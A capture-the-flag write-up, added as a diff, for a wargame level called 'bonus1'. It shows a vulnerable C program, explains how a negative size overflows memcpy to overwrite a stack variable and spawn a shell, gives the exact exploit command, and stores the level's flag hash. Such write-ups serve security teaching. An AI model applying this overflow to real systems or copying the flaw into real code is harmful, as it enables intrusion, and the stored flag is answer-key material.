@@ -1,0 +1,52 @@
+flag: 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
+
+int main(int ac, char **av) {
+	int exit_code;
+
+	char buff[40];
+	int nb;
+
+	nb = atoi(av[1]);
+	if (nb < 10) {
+		memcpy(buff, av[2], nb*4);
+		if (nb == 0x574f4c46) {
+			execl("/bin/sh", "sh", 0);
+		}
+		exit_code = 0;
+	} else {
+		exit_code = 1;
+	}
+
+	return exit_code;
+}
+
+Seeing this code, the goal of the level is obviously to rewrite nb, probably with an
+overflow on memcpy. The problem is that we seemingly can't, as the only entries which
+can access the memcpy part are inferior to 10, so the biggest value would instinctively
+be 9, and as the size copied is 4*nb it would be a maximum of 36, which can't overflow
+40.
+However, the programmer seems to forget that atoi returns an int, but memcpy takes
+a size_t which is unsigned, so we can put a negative value that overflows to 44, which
+would overwrite nb because it is right after the buffer in the stack.
+
+The value of the second arg is obviously 40 bytes of padding then 0x574f4c46 in little
+endian, what is left to determine is the value of the first arg, which we can calculate.
+
+To calculate it, it is pretty simple:
+Casting something to an unsigned int on 32 bits apply a modulo 2**32 on said value.
+So if we cast 2**32+44, it will overflow to 44.
+We are only allowed negative values, but it works pretty much the same, we just add a
+minus in front of the 2**32.
+Remember, this value is obtained through a *4 multiplication: we divide -2**32+44 by 4.
+So our formula is:
+
+	s = (-2^32+u)/4
+	with s = The signed value we enter in the first arg
+	and  u = The unsigned value memcpy will receive
+
+and argv[1] = (-2^32+u)/4
+			= -1073741813
+
+./bonus1 -1073741813 $(python -c 'print "A"*40+"\x46\x4c\x4f\x57"')
+
+> cat /home/user/bonus2/.pass
